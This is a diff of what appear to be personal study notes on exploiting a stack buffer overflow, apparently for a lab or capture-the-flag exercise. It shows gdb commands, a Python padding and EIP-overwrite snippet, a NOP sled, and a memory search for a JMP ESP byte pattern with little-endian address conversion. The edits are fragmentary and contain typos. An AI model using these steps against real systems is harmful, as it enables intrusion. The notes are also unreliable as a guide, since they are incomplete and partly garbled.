@@ -173,6 +173,7 @@ File > Export
     gdb ./file
     info functions
     pdisass main
+    look for get requests
 
 ## Steps
     #!/usr/bin/env python
@@ -180,10 +181,7 @@ File > Export
     print (offset)
 or
     
-    offset = "A" * 62
-        eip = "BBBB" 
-
-        print(offset+eip)
+  show
     
     run <<<$(python scwipt.py)
 
@@ -198,9 +196,10 @@ or
     nop = "\x90" * 15
     
     print(offset+eip)
-## run (ctrl+c to crash)
+## run <<< $(python scriptname.py)
+find registry numer at EIP, input it on wiremask.eu
     info proc map
-    find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4 
+   run on target system: find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4 
 ## take first 4 addresses 
     0xf7de3b59 -> "\x59\x3b\xde\xf7"
     0xf7f588ab
